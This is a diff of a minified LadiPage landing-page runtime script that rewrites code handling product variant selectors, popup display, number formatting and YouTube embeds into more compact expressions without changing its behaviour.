@@ -160,7 +160,7 @@
         n = function (i) {
           if ('string' == typeof i)
             return r.createHash(e).update(i, 'utf8').digest('hex');
-          if (null === i || void 0 === i) throw new Error(h);
+          if (null == i) throw new Error(h);
           return (
             i.constructor === ArrayBuffer && (i = new Uint8Array(i)),
             Array.isArray(i) || ArrayBuffer.isView(i) || i.constructor === s
@@ -839,11 +839,11 @@ var equalsLadiPage = function (t, e) {
     (isEmptyLadiPage(i) || isEmptyLadiPage(a)) && ((i = ''), (a = 0)),
       isEmptyLadiPage(e) && (e = '');
     var n = LadiPageScript.formatNumber(t, null, null, a);
-    return (n = (n = n
+    return (n = n
       .replaceAll(',', 'LADIPAGE_NUMBER_COMMA')
       .replaceAll('.', 'LADIPAGE_NUMBER_DOT'))
       .replaceAll('LADIPAGE_NUMBER_COMMA', e)
-      .replaceAll('LADIPAGE_NUMBER_DOT', i));
+      .replaceAll('LADIPAGE_NUMBER_DOT', i);
   },
   textToNumber = function (t, e, i, a) {
     (isEmptyLadiPage(i) || isEmptyLadiPage(a)) && (a = 0);
@@ -915,7 +915,7 @@ var equalsLadiPage = function (t, e) {
           (l += String.fromCharCode(e)),
           64 != o && (l += String.fromCharCode(i)),
           64 != r && (l += String.fromCharCode(a));
-      return (l = Base64._utf8_decode(l));
+      return Base64._utf8_decode(l);
     },
     _utf8_encode: function (t) {
       t = t.replace(/\r\n/g, '\n');
@@ -956,7 +956,7 @@ var equalsLadiPage = function (t, e) {
     MOBILE: 'mobile',
     DEVICE: 'device',
     DOMAIN_GOOGLE_DOCS: 'docs.google.com',
-    POWERED_BY_IMAGE: './w.ladicdn.com/source/v3/by/ladipage.svg?v=1.0',
+    POWERED_BY_IMAGE: './source/v3/by/ladipage.svg?v=1.0',
     STATIC_W_DOMAIN: 'w.ladicdn.com',
     STATIC_S_DOMAIN: 's.ladicdn.com',
     APP_RUNTIME_PREFIX: '_runtime',
@@ -1633,9 +1633,9 @@ var LadiFormulaData = {},
         isObjectLadiPage(o) &&
           Object.keys(o).forEach(function (t) {
             i.runtime.eventDataGlobal[t] = o[t];
-          });
-        a == n.length &&
-          (c(), u(), p(), (i.runtime.isLoadHtmlGlobal = !0), i.run(t, e));
+          }),
+          a == n.length &&
+            (c(), u(), p(), (i.runtime.isLoadHtmlGlobal = !0), i.run(t, e));
       },
       c = function () {
         i.runtime.shopping ||
@@ -1843,15 +1843,15 @@ var LadiFormulaData = {},
         (n = a.getOptimizeSourceKey(o)),
         (a.runtime.tmp['DATA_O_' + i] = n);
     }
-    isObjectLadiPage(t) &&
-      Object.keys(t).forEach(function (e) {
-        -1 == a.const.OPTIMIZE_EXCEPT_EVENT_DATA_KEY_LIST.indexOf(e)
-          ? isNullLadiPage(n[e])
-            ? (t[e] = a.optimizeEventData(t[e], null, i))
-            : ((t[n[e]] = a.optimizeEventData(t[e], null, i)), delete t[e])
-          : isNullLadiPage(n[e]) || ((t[n[e]] = t[e]), delete t[e]);
-      });
     return (
+      isObjectLadiPage(t) &&
+        Object.keys(t).forEach(function (e) {
+          -1 == a.const.OPTIMIZE_EXCEPT_EVENT_DATA_KEY_LIST.indexOf(e)
+            ? isNullLadiPage(n[e])
+              ? (t[e] = a.optimizeEventData(t[e], null, i))
+              : ((t[n[e]] = a.optimizeEventData(t[e], null, i)), delete t[e])
+            : isNullLadiPage(n[e]) || ((t[n[e]] = t[e]), delete t[e]);
+        }),
       isArrayLadiPage(t) &&
         t.forEach(function (e, n) {
           t[n] = a.optimizeEventData(e, null, i);
@@ -2157,10 +2157,7 @@ var LadiFormulaData = {},
           var f = getComputedStyle(y).backgroundImage;
           f.toLowerCase().startsWith('url("') &&
             f.toLowerCase().endsWith('")') &&
-            ((f = (f = f.substr('url("'.length)).substr(
-              0,
-              f.length - '")'.length
-            )),
+            ((f = (f = f.substr(5)).substr(0, f.length - 2)),
             isEmptyLadiPage(f) || (_ = f));
         }
       }
@@ -2178,8 +2175,11 @@ var LadiFormulaData = {},
                 c.runtime.isLoadYouTubeIframeAPI ||
                   ((c.runtime.isLoadYouTubeIframeAPI = !0),
                   (window.onYouTubeIframeAPIReady = function () {
-                    c.runtime.isYouTubeIframeAPIReady = !0;
-                    for (; c.runtime.list_youtube_ready_exec.length > 0; )
+                    for (
+                      c.runtime.isYouTubeIframeAPIReady = !0;
+                      c.runtime.list_youtube_ready_exec.length > 0;
+
+                    )
                       c.runtime.list_youtube_ready_exec.shift()();
                   }),
                   c.loadScript('https://www.youtube.com/iframe_api')),
@@ -2371,7 +2371,7 @@ var LadiFormulaData = {},
         l.insert(d + 1, 's' + e + 'x' + i);
       }
     }
-    return (t = l.join('/'));
+    return l.join('/');
   }),
   (LadiPageScriptV2.prototype.historyReplaceState = function (t) {
     try {
@@ -2840,9 +2840,8 @@ var LadiFormulaData = {},
           ),
           t.runTimeout(g, t.runtime.tracking_global_delay);
       }
-      for (; t.runtime.list_loaded_func.length > 0; ) {
+      for (; t.runtime.list_loaded_func.length > 0; )
         t.runtime.list_loaded_func.shift()();
-      }
       t.runtime.tmp.is_loaded_func_done = !0;
       var _ = document.getElementById('style_update_height_element');
       isEmptyLadiPage(_) || _.parentElement.removeChild(_);
@@ -3041,12 +3040,11 @@ var LadiFormulaData = {},
     for (
       var e = '',
         i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
-        a = i.length,
         n = 0;
       n < t;
       n++
     )
-      e += i.charAt(Math.floor(Math.random() * a));
+      e += i.charAt(Math.floor(52 * Math.random()));
     return e;
   }),
   (LadiPageScriptV2.prototype.runCallback = function (t, e) {
@@ -3127,11 +3125,11 @@ var LadiFormulaData = {},
       -1 != e.toLowerCase().indexOf('watch')
         ? (e = this.getURLSearchParams(i.search, 'v', !1))
         : -1 != e.toLowerCase().indexOf('embed/')
-        ? (e = i.pathname.substring('/embed/'.length))
+        ? (e = i.pathname.substring(7))
         : -1 != e.toLowerCase().indexOf('shorts/')
-        ? (e = i.pathname.substring('/shorts/'.length))
+        ? (e = i.pathname.substring(8))
         : -1 != e.toLowerCase().indexOf('youtu.be') &&
-          (e = i.pathname.substring('/'.length));
+          (e = i.pathname.substring(1));
     }
     return e;
   }),
@@ -3222,11 +3220,11 @@ var LadiFormulaData = {},
           } catch (t) {}
           r(t, this.status, this, e);
         }),
-        d.open(t, e, a);
-      isObjectLadiPage(n) &&
-        Object.keys(n).forEach(function (t) {
-          d.setRequestHeader(t, n[t]);
-        }),
+        d.open(t, e, a),
+        isObjectLadiPage(n) &&
+          Object.keys(n).forEach(function (t) {
+            d.setRequestHeader(t, n[t]);
+          }),
         isObjectLadiPage(o) &&
           Object.keys(o).forEach(function (t) {
             d[t] = o[t];
@@ -3334,17 +3332,15 @@ var LadiFormulaData = {},
             .getElementsByTagName('span')[0];
           if (!isEmptyLadiPage(r)) {
             var l = r.getAttribute('data-text-old');
-            if (
-              (isEmptyLadiPage(l) &&
-                ((l = r.textContent),
-                r.setAttribute('data-text-old', l),
-                r.setAttribute('placeholder', l)),
-              e)
-            )
-              o(t, r, !1, l, l), t.setAttribute('value', n);
-            else if (a && !r.classList.contains('ladi-hidden')) {
-              o(t, r, !0, '', l), t.setAttribute('value', '');
-            }
+            isEmptyLadiPage(l) &&
+              ((l = r.textContent),
+              r.setAttribute('data-text-old', l),
+              r.setAttribute('placeholder', l)),
+              e
+                ? (o(t, r, !1, l, l), t.setAttribute('value', n))
+                : a &&
+                  !r.classList.contains('ladi-hidden') &&
+                  (o(t, r, !0, '', l), t.setAttribute('value', ''));
           }
         };
       try {
@@ -3683,11 +3679,12 @@ var LadiFormulaData = {},
           S++
         ) {
           var Y = o.runtime.tmp.getLabelValue(w[S]);
-          if (!isEmptyLadiPage(Y))
-            o
+          isEmptyLadiPage(Y) ||
+            (o
               .findAncestor(w[S], 'ladi-element')
               .getAttribute('data-title-type') ==
-              o.const.PRODUCT_VARIANT_TITLE.top && (Y = ': ' + Y);
+              o.const.PRODUCT_VARIANT_TITLE.top &&
+              (Y = ': ' + Y));
           var U = o.findAncestor(w[S], 'ladi-form-item-box');
           isEmptyLadiPage(U) ||
             ((U = U.querySelector('.ladi-form-item-title-value')),
@@ -3703,140 +3700,150 @@ var LadiFormulaData = {},
       o = e['option.ladisale_store_id'] || null,
       r = e['option.product_id'],
       l = i.generateVariantProduct(e, !1, null, null, null, null, !0, !0);
-    if (
-      !isObjectLadiPage(l) ||
-      !isObjectLadiPage(l.store_info) ||
-      !isObjectLadiPage(l.product) ||
-      !isArrayLadiPage(l.product.variants) ||
-      l.product.variants.length <= 0
-    )
-      return a;
-    this.runtime.isClient
-      ? Object.keys(this.runtime.eventData).forEach(function (e) {
-          if ((isEmptyLadiPage(t) || t == e) && -1 == a) {
-            var d = i.runtime.eventData[e];
-            if (
-              'form' == d.type &&
-              d['option.is_add_to_cart'] &&
-              d['option.product_type'] == n &&
-              d['option.product_id'] == r &&
-              d['option.ladisale_store_id'] == o
-            ) {
-              var s = document.getElementById(e);
-              if (!isEmptyLadiPage(s)) {
-                var c = s.querySelector('[data-variant="true"]');
-                if (!isEmptyLadiPage(c)) {
-                  var u = i.runtime.eventData[c.id];
-                  if (!isEmptyLadiPage(u)) {
-                    var p = null;
-                    if (
-                      (u['option.product_variant_type'] ==
-                        i.const.PRODUCT_VARIANT_TYPE.combobox &&
-                        ((p = c.querySelectorAll(
-                          '.ladi-form-item select[data-product-option-id]'
-                        )),
-                        (a = l.product.variants.findIndex(function (t) {
-                          for (
-                            var e = !0,
-                              i = null,
-                              a = function (t) {
-                                return t == i;
-                              },
-                              n = 0;
-                            n < p.length;
-                            n++
-                          )
-                            if (
-                              p[n].getAttribute('data-store-id') ==
-                                l.store_info.id &&
-                              p[n].getAttribute('data-product-id') ==
-                                t.product_id
-                            ) {
-                              i = p[n].getAttribute('data-product-option-id');
-                              var o = p[n].value;
-                              if (isStringLadiPage(t.option_ids)) {
-                                var r = t.option_ids.split('/').findIndex(a);
-                                if (-1 != r && t['option' + (r + 1)] != o) {
-                                  e = !1;
-                                  break;
-                                }
-                              }
-                            }
-                          return e;
-                        }))),
-                      u['option.product_variant_type'] ==
-                        i.const.PRODUCT_VARIANT_TYPE.label &&
-                        ((p = c.querySelectorAll(
-                          '.ladi-form-label-container[data-product-option-id]'
-                        )),
-                        (a = l.product.variants.findIndex(function (t) {
-                          for (
-                            var e = !0,
-                              a = null,
-                              n = function (t) {
-                                return t == a;
-                              },
-                              o = 0;
-                            o < p.length;
-                            o++
-                          )
-                            if (
-                              p[o].getAttribute('data-store-id') ==
-                                l.store_info.id &&
-                              p[o].getAttribute('data-product-id') ==
-                                t.product_id
-                            ) {
-                              a = p[o].getAttribute('data-product-option-id');
-                              var r = i.runtime.tmp.getLabelValue(p[o]);
-                              if (isStringLadiPage(t.option_ids)) {
-                                var d = t.option_ids.split('/').findIndex(n);
-                                if (-1 != d && t['option' + (d + 1)] != r) {
-                                  e = !1;
-                                  break;
-                                }
-                              }
-                            }
-                          return e;
-                        }))),
-                      u['option.product_variant_type'] ==
-                        i.const.PRODUCT_VARIANT_TYPE.combined)
-                    ) {
-                      var m = c.querySelector('.ladi-form-control');
-                      if (
-                        isEmptyLadiPage(m) ||
-                        m.getAttribute('data-store-id') != l.store_info.id ||
-                        m.getAttribute('data-product-id') !=
-                          l.product.product_id
-                      )
-                        return;
-                      if (
-                        ((a = m.value),
-                        (a = isEmptyLadiPage(a) ? -1 : parseInt(a)),
-                        'none' == getComputedStyle(c).display)
-                      ) {
-                        var g = null;
-                        -1 == a &&
-                          (isEmptyLadiPage(d['option.product_variant_id']) ||
-                            ((g = m.querySelector(
-                              'option[data-product-variant-id="' +
-                                d['option.product_variant_id'] +
-                                '"]'
+    return isObjectLadiPage(l) &&
+      isObjectLadiPage(l.store_info) &&
+      isObjectLadiPage(l.product) &&
+      isArrayLadiPage(l.product.variants) &&
+      !(l.product.variants.length <= 0)
+      ? (this.runtime.isClient
+          ? Object.keys(this.runtime.eventData).forEach(function (e) {
+              if ((isEmptyLadiPage(t) || t == e) && -1 == a) {
+                var d = i.runtime.eventData[e];
+                if (
+                  'form' == d.type &&
+                  d['option.is_add_to_cart'] &&
+                  d['option.product_type'] == n &&
+                  d['option.product_id'] == r &&
+                  d['option.ladisale_store_id'] == o
+                ) {
+                  var s = document.getElementById(e);
+                  if (!isEmptyLadiPage(s)) {
+                    var c = s.querySelector('[data-variant="true"]');
+                    if (!isEmptyLadiPage(c)) {
+                      var u = i.runtime.eventData[c.id];
+                      if (!isEmptyLadiPage(u)) {
+                        var p = null;
+                        if (
+                          (u['option.product_variant_type'] ==
+                            i.const.PRODUCT_VARIANT_TYPE.combobox &&
+                            ((p = c.querySelectorAll(
+                              '.ladi-form-item select[data-product-option-id]'
                             )),
-                            isEmptyLadiPage(g) ||
-                              (a = parseInt(g.getAttribute('value')) || -1))),
-                          -1 == a &&
-                            ((g = m.querySelector('option[value="0"]')),
-                            isEmptyLadiPage(g) || (a = 0));
+                            (a = l.product.variants.findIndex(function (t) {
+                              for (
+                                var e = !0,
+                                  i = null,
+                                  a = function (t) {
+                                    return t == i;
+                                  },
+                                  n = 0;
+                                n < p.length;
+                                n++
+                              )
+                                if (
+                                  p[n].getAttribute('data-store-id') ==
+                                    l.store_info.id &&
+                                  p[n].getAttribute('data-product-id') ==
+                                    t.product_id
+                                ) {
+                                  i = p[n].getAttribute(
+                                    'data-product-option-id'
+                                  );
+                                  var o = p[n].value;
+                                  if (isStringLadiPage(t.option_ids)) {
+                                    var r = t.option_ids
+                                      .split('/')
+                                      .findIndex(a);
+                                    if (-1 != r && t['option' + (r + 1)] != o) {
+                                      e = !1;
+                                      break;
+                                    }
+                                  }
+                                }
+                              return e;
+                            }))),
+                          u['option.product_variant_type'] ==
+                            i.const.PRODUCT_VARIANT_TYPE.label &&
+                            ((p = c.querySelectorAll(
+                              '.ladi-form-label-container[data-product-option-id]'
+                            )),
+                            (a = l.product.variants.findIndex(function (t) {
+                              for (
+                                var e = !0,
+                                  a = null,
+                                  n = function (t) {
+                                    return t == a;
+                                  },
+                                  o = 0;
+                                o < p.length;
+                                o++
+                              )
+                                if (
+                                  p[o].getAttribute('data-store-id') ==
+                                    l.store_info.id &&
+                                  p[o].getAttribute('data-product-id') ==
+                                    t.product_id
+                                ) {
+                                  a = p[o].getAttribute(
+                                    'data-product-option-id'
+                                  );
+                                  var r = i.runtime.tmp.getLabelValue(p[o]);
+                                  if (isStringLadiPage(t.option_ids)) {
+                                    var d = t.option_ids
+                                      .split('/')
+                                      .findIndex(n);
+                                    if (-1 != d && t['option' + (d + 1)] != r) {
+                                      e = !1;
+                                      break;
+                                    }
+                                  }
+                                }
+                              return e;
+                            }))),
+                          u['option.product_variant_type'] ==
+                            i.const.PRODUCT_VARIANT_TYPE.combined)
+                        ) {
+                          var m = c.querySelector('.ladi-form-control');
+                          if (
+                            isEmptyLadiPage(m) ||
+                            m.getAttribute('data-store-id') !=
+                              l.store_info.id ||
+                            m.getAttribute('data-product-id') !=
+                              l.product.product_id
+                          )
+                            return;
+                          if (
+                            ((a = m.value),
+                            (a = isEmptyLadiPage(a) ? -1 : parseInt(a)),
+                            'none' == getComputedStyle(c).display)
+                          ) {
+                            var g = null;
+                            -1 == a &&
+                              (isEmptyLadiPage(
+                                d['option.product_variant_id']
+                              ) ||
+                                ((g = m.querySelector(
+                                  'option[data-product-variant-id="' +
+                                    d['option.product_variant_id'] +
+                                    '"]'
+                                )),
+                                isEmptyLadiPage(g) ||
+                                  (a =
+                                    parseInt(g.getAttribute('value')) || -1))),
+                              -1 == a &&
+                                ((g = m.querySelector('option[value="0"]')),
+                                isEmptyLadiPage(g) || (a = 0));
+                          }
+                        }
                       }
                     }
                   }
                 }
               }
-            }
-          }
-        })
-      : (a = 0);
-    return a;
+            })
+          : (a = 0),
+        a)
+      : a;
   }),
   (LadiPageScriptV2.prototype.getProductVariantId = function (t, e) {
     var i = null,
@@ -4188,29 +4195,29 @@ var LadiFormulaData = {},
                   var n = null;
                   isEmptyLadiPage(i) ||
                     (isStringLadiPage(i.option_ids) &&
-                      (n = i.option_ids.split('/')));
-                  e.values.forEach(function (t) {
-                    var a = (function (t) {
-                      var a = '';
-                      return (
-                        isArrayLadiPage(n) &&
-                          n.forEach(function (n, o) {
-                            e.product_option_id == n &&
-                              t == i['option' + (o + 1)] &&
-                              (a = ' selected');
-                          }),
-                        a
-                      );
-                    })(t.name);
-                    l +=
-                      '<option' +
-                      a +
-                      ' value="' +
-                      t.name +
-                      '">' +
-                      (t.name_new || t.name) +
-                      '</option>';
-                  }),
+                      (n = i.option_ids.split('/'))),
+                    e.values.forEach(function (t) {
+                      var a = (function (t) {
+                        var a = '';
+                        return (
+                          isArrayLadiPage(n) &&
+                            n.forEach(function (n, o) {
+                              e.product_option_id == n &&
+                                t == i['option' + (o + 1)] &&
+                                (a = ' selected');
+                            }),
+                          a
+                        );
+                      })(t.name);
+                      l +=
+                        '<option' +
+                        a +
+                        ' value="' +
+                        t.name +
+                        '">' +
+                        (t.name_new || t.name) +
+                        '</option>';
+                    }),
                     (l += '</select></div></div></div>');
                 }
               }),
@@ -4244,46 +4251,46 @@ var LadiFormulaData = {},
                   var n = null;
                   isEmptyLadiPage(i) ||
                     (isStringLadiPage(i.option_ids) &&
-                      (n = i.option_ids.split('/')));
-                  e.values.forEach(function (t, a) {
-                    0 == a &&
-                      (t.type == c.const.PRODUCT_VARIANT_OPTION_TYPE.image
-                        ? (l +=
-                            '<div class="ladi-form-label-item image no-value" data-value=""></div>')
-                        : t.type == c.const.PRODUCT_VARIANT_OPTION_TYPE.color
-                        ? (l +=
-                            '<div class="ladi-form-label-item color no-value" data-value=""></div>')
-                        : (l +=
-                            '<div class="ladi-form-label-item text no-value" data-value="">&nbsp;</div>'));
-                    var o = (function (t) {
-                      var a = '';
-                      return (
-                        isArrayLadiPage(n) &&
-                          n.forEach(function (n, o) {
-                            e.product_option_id == n &&
-                              t == i['option' + (o + 1)] &&
-                              (a = ' selected');
-                          }),
-                        a
-                      );
-                    })(t.name);
-                    if (t.type == c.const.PRODUCT_VARIANT_OPTION_TYPE.image) {
-                      var r = t.value;
-                      isEmptyLadiPage(r) ||
-                        !isStringLadiPage(r) ||
-                        r.startsWith('http://') ||
-                        r.startsWith('https://') ||
-                        r.startsWith('//') ||
-                        (r = 'https://' + c.const.STATIC_W_DOMAIN + '/' + r),
-                        (r = c.getOptimizeImage(r, 100, 100, !1, !1, !1, !0)),
-                        (l +=
-                          `<div class="ladi-form-label-item image${o}" style='background-image: url("${r}");' title="` +
-                          (t.name_new || t.name) +
-                          '" data-value="' +
-                          t.name +
-                          '"></div>');
-                    } else t.type == c.const.PRODUCT_VARIANT_OPTION_TYPE.color ? (l += '<div class="ladi-form-label-item color' + o + '" style=\'background-color: ' + t.value + ';\' title="' + (t.name_new || t.name) + '" data-value="' + t.name + '"></div>') : (l += '<div class="ladi-form-label-item text' + o + '" data-value="' + t.name + '">' + (t.name_new || t.name) + '</div>');
-                  }),
+                      (n = i.option_ids.split('/'))),
+                    e.values.forEach(function (t, a) {
+                      0 == a &&
+                        (t.type == c.const.PRODUCT_VARIANT_OPTION_TYPE.image
+                          ? (l +=
+                              '<div class="ladi-form-label-item image no-value" data-value=""></div>')
+                          : t.type == c.const.PRODUCT_VARIANT_OPTION_TYPE.color
+                          ? (l +=
+                              '<div class="ladi-form-label-item color no-value" data-value=""></div>')
+                          : (l +=
+                              '<div class="ladi-form-label-item text no-value" data-value="">&nbsp;</div>'));
+                      var o = (function (t) {
+                        var a = '';
+                        return (
+                          isArrayLadiPage(n) &&
+                            n.forEach(function (n, o) {
+                              e.product_option_id == n &&
+                                t == i['option' + (o + 1)] &&
+                                (a = ' selected');
+                            }),
+                          a
+                        );
+                      })(t.name);
+                      if (t.type == c.const.PRODUCT_VARIANT_OPTION_TYPE.image) {
+                        var r = t.value;
+                        isEmptyLadiPage(r) ||
+                          !isStringLadiPage(r) ||
+                          r.startsWith('http://') ||
+                          r.startsWith('https://') ||
+                          r.startsWith('//') ||
+                          (r = 'https://' + c.const.STATIC_W_DOMAIN + '/' + r),
+                          (r = c.getOptimizeImage(r, 100, 100, !1, !1, !1, !0)),
+                          (l +=
+                            `<div class="ladi-form-label-item image${o}" style='background-image: url("${r}");' title="` +
+                            (t.name_new || t.name) +
+                            '" data-value="' +
+                            t.name +
+                            '"></div>');
+                      } else t.type == c.const.PRODUCT_VARIANT_OPTION_TYPE.color ? (l += '<div class="ladi-form-label-item color' + o + '" style=\'background-color: ' + t.value + ';\' title="' + (t.name_new || t.name) + '" data-value="' + t.name + '"></div>') : (l += '<div class="ladi-form-label-item text' + o + '" data-value="' + t.name + '">' + (t.name_new || t.name) + '</div>');
+                    }),
                     (l += '</div></div>');
                 }
               });
@@ -5967,7 +5974,7 @@ var LadiFormulaData = {},
           }, 1e3 * p);
       }
       if (i.is_multiple) {
-        var m = [];
+        var m;
         (m =
           'carousel' == i.element_type
             ? t.querySelectorAll(
@@ -6534,12 +6541,12 @@ var LadiFormulaData = {},
             r.push(l[d].id);
         if (
           (Object.keys(e.runtime.eventData).forEach(function (t) {
-            var i = e.runtime.eventData[t],
+            var s,
+              i = e.runtime.eventData[t],
               n = null,
               o = null,
               l = null,
-              d = Object.keys(e.runtime.list_scroll_func),
-              s = [];
+              d = Object.keys(e.runtime.list_scroll_func);
             s =
               'gallery' == i.type
                 ? document.querySelectorAll('#' + t)
@@ -6794,20 +6801,18 @@ var LadiFormulaData = {},
           s = s > 100 ? 100 : s;
           var c = function (t) {
               var i = (function (t) {
-                  if (
-                    t ||
+                  return t ||
                     (isObjectLadiPage(window.ladi_conversion_api) &&
                       isObjectLadiPage(window.ladi_conversion_api.tiktok) &&
                       isArrayLadiPage(window.ladi_conversion_api.tiktok.pixels))
-                  )
-                    return {
-                      event_id:
-                        'ladi.' +
-                        Date.now() +
-                        '.' +
-                        (Math.floor(9e10 * Math.random()) + 1e10),
-                    };
-                  return {};
+                    ? {
+                        event_id:
+                          'ladi.' +
+                          Date.now() +
+                          '.' +
+                          (Math.floor(9e10 * Math.random()) + 1e10),
+                      }
+                    : {};
                 })(e.runtime.is_popupx),
                 a = null;
               e.runtime.is_popupx
@@ -6926,72 +6931,67 @@ var LadiFormulaData = {},
       u = 0;
     if (isEmptyLadiPage(t)) for (u = 0; u < r.length; u++) c.push(r[u].id);
     else c.push(t);
-    if (
-      (c.forEach(function (t) {
-        var i = document.getElementById(t);
-        if (!isEmptyLadiPage(i)) {
-          o.runtime.has_popupx &&
-            ('none' != getComputedStyle(i).display && (d = !0),
-            document.body.style.removeProperty('height'));
-          var a = parseFloatLadiPage(i.getAttribute('data-timeout-id')) || null;
+    c.forEach(function (t) {
+      var i = document.getElementById(t);
+      if (!isEmptyLadiPage(i)) {
+        o.runtime.has_popupx &&
+          ('none' != getComputedStyle(i).display && (d = !0),
+          document.body.style.removeProperty('height'));
+        var a = parseFloatLadiPage(i.getAttribute('data-timeout-id')) || null;
+        o.removeTimeout(a),
+          i.removeAttribute('data-timeout-id'),
+          (a = parseFloatLadiPage(i.getAttribute('data-timeout-id-2')) || null),
           o.removeTimeout(a),
-            i.removeAttribute('data-timeout-id'),
-            (a =
-              parseFloatLadiPage(i.getAttribute('data-timeout-id-2')) || null),
-            o.removeTimeout(a),
-            i.removeAttribute('data-timeout-id-2'),
-            (a =
-              parseFloatLadiPage(i.getAttribute('data-timeout-id-3')) || null),
-            o.removeTimeout(a),
-            i.removeAttribute('data-timeout-id-3');
-          var n = i.getElementsByClassName('popup-close')[0];
-          isEmptyLadiPage(n) ||
-            ((a =
-              parseFloatLadiPage(n.getAttribute('data-timeout-id')) || null),
-            o.removeTimeout(a),
-            n.removeAttribute('data-timeout-id')),
-            o.pauseAllVideo(i),
-            isEmptyLadiPage(i.style.getPropertyValue('display')) ||
-              ((l = !0), o.runActionPopupHide(t)),
-            i.style.removeProperty('display'),
-            i.style.removeProperty('z-index');
-          var c = i.hasAttribute('data-popup-backdrop'),
-            u = o.runtime.eventData[t];
-          if (
-            (isObjectLadiPage(u) &&
-              u[o.runtime.device + '.option.popup_position'] ==
-                o.const.POSITION_TYPE.default &&
-              (c = !0),
-            c)
-          ) {
-            s(),
-              e &&
-                (isEmptyLadiPage(o.runtime.tmp.bodyScrollY) ||
-                  window.scrollTo(0, o.runtime.tmp.bodyScrollY)),
-              (o.runtime.tmp.bodyScrollY = null);
-            for (var p = 0; p < r.length; p++)
-              r[p].style.removeProperty('z-index');
-          }
-          i.removeAttribute('data-scroll'),
-            i.removeAttribute('data-fixed-close'),
-            i.style.removeProperty('overflow-y'),
-            i.style.removeProperty('overflow-x');
-          var m = i.getElementsByClassName('ladi-popup')[0];
-          isEmptyLadiPage(m) || m.style.removeProperty('height'),
-            i.style.removeProperty('max-height');
+          i.removeAttribute('data-timeout-id-2'),
+          (a = parseFloatLadiPage(i.getAttribute('data-timeout-id-3')) || null),
+          o.removeTimeout(a),
+          i.removeAttribute('data-timeout-id-3');
+        var n = i.getElementsByClassName('popup-close')[0];
+        isEmptyLadiPage(n) ||
+          ((a = parseFloatLadiPage(n.getAttribute('data-timeout-id')) || null),
+          o.removeTimeout(a),
+          n.removeAttribute('data-timeout-id')),
+          o.pauseAllVideo(i),
+          isEmptyLadiPage(i.style.getPropertyValue('display')) ||
+            ((l = !0), o.runActionPopupHide(t)),
+          i.style.removeProperty('display'),
+          i.style.removeProperty('z-index');
+        var c = i.hasAttribute('data-popup-backdrop'),
+          u = o.runtime.eventData[t];
+        if (
+          (isObjectLadiPage(u) &&
+            u[o.runtime.device + '.option.popup_position'] ==
+              o.const.POSITION_TYPE.default &&
+            (c = !0),
+          c)
+        ) {
+          s(),
+            e &&
+              (isEmptyLadiPage(o.runtime.tmp.bodyScrollY) ||
+                window.scrollTo(0, o.runtime.tmp.bodyScrollY)),
+            (o.runtime.tmp.bodyScrollY = null);
+          for (var p = 0; p < r.length; p++)
+            r[p].style.removeProperty('z-index');
         }
-      }),
+        i.removeAttribute('data-scroll'),
+          i.removeAttribute('data-fixed-close'),
+          i.style.removeProperty('overflow-y'),
+          i.style.removeProperty('overflow-x');
+        var m = i.getElementsByClassName('ladi-popup')[0];
+        isEmptyLadiPage(m) || m.style.removeProperty('height'),
+          i.style.removeProperty('max-height');
+      }
+    }),
       l && isFunctionLadiPage(i) && i(),
       a && s(),
-      !n && d)
-    ) {
-      o.runtime.tmp.runActionPopupX({
-        id: t,
-        dimension: { display: 'none' },
-        action: { type: 'set_iframe_dimension' },
-      });
-    }
-    delete this.runtime.tmp.current_default_popup_id;
+      !n &&
+        d &&
+        o.runtime.tmp.runActionPopupX({
+          id: t,
+          dimension: { display: 'none' },
+          action: { type: 'set_iframe_dimension' },
+        }),
+      delete this.runtime.tmp.current_default_popup_id;
   }),
   (LadiPageScriptV2.prototype.runShowPopup = function (t, e, i, a, n, o) {
     var r = this;
@@ -7016,25 +7016,25 @@ var LadiFormulaData = {},
             r.runtime.tmp.is_run_show_popup = !0;
             var s = 0,
               c = '';
-            n || LadiPagePlugin.getPlugin('popup').showStyleShowPopupBuilder(e);
-            isEmptyLadiPage(a)
-              ? (c += n
-                  ? '#' +
+            n || LadiPagePlugin.getPlugin('popup').showStyleShowPopupBuilder(e),
+              isEmptyLadiPage(a)
+                ? (c += n
+                    ? '#' +
+                      r.runtime.backdrop_popup_id +
+                      ' { display: none !important;}'
+                    : '#' +
+                      r.runtime.backdrop_popup_id +
+                      ' { display: block !important;}')
+                : ((c +=
+                    '#' +
                     r.runtime.backdrop_popup_id +
-                    ' { display: none !important;}'
-                  : '#' +
-                    r.runtime.backdrop_popup_id +
-                    ' { display: block !important;}')
-              : ((c +=
-                  '#' +
-                  r.runtime.backdrop_popup_id +
-                  ' { display: block !important; ' +
-                  a +
-                  '}'),
-                l.setAttribute('data-popup-backdrop', !0)),
+                    ' { display: block !important; ' +
+                    a +
+                    '}'),
+                  l.setAttribute('data-popup-backdrop', !0)),
               i == r.const.POSITION_TYPE.default &&
                 'true' != l.getAttribute('data-dropbox') &&
-                (!(function () {
+                ((function () {
                   if (!r.runtime.has_popupx && n) {
                     var t = window.scrollY;
                     if (!isEmptyLadiPage(r.runtime.tmp.bodyScrollY)) {
@@ -7074,9 +7074,8 @@ var LadiFormulaData = {},
                 (r.runtime.tmp.current_default_popup_id = e));
             var u = 'block' == l.style.getPropertyValue('display');
             if (isArrayLadiPage(r.runtime.list_show_popup_func[e]))
-              for (; r.runtime.list_show_popup_func[e].length > 0; ) {
+              for (; r.runtime.list_show_popup_func[e].length > 0; )
                 r.runtime.list_show_popup_func[e].shift()();
-              }
             var p = l.hasAttribute('data-scroll'),
               m = l.hasAttribute('data-fixed-close'),
               g = !1,
@@ -7089,7 +7088,8 @@ var LadiFormulaData = {},
                 1e3 *
                 (parseFloatLadiPage(getComputedStyle(_).animationDelay) || 0),
               v = parseFloatLadiPage(l.getAttribute('data-timeout-id')) || null;
-            r.removeTimeout(v),
+            if (
+              (r.removeTimeout(v),
               (v =
                 parseFloatLadiPage(l.getAttribute('data-timeout-id-2')) ||
                 null),
@@ -7100,9 +7100,8 @@ var LadiFormulaData = {},
                 r.runtime.tmp.is_wait_popup ||
                 (isEmptyLadiPage(l.style.getPropertyValue('max-height')) &&
                   (r.runtime.has_popupx ||
-                    l.style.setProperty('visibility', 'hidden')));
-            if (
-              (l.classList.add('ladi-animation-hidden'),
+                    l.style.setProperty('visibility', 'hidden'))),
+              l.classList.add('ladi-animation-hidden'),
               'block' != getComputedStyle(l).display &&
                 l.style.setProperty('display', 'block', 'important'),
               (v = r.runTimeout(function () {
@@ -7312,17 +7311,16 @@ var LadiFormulaData = {},
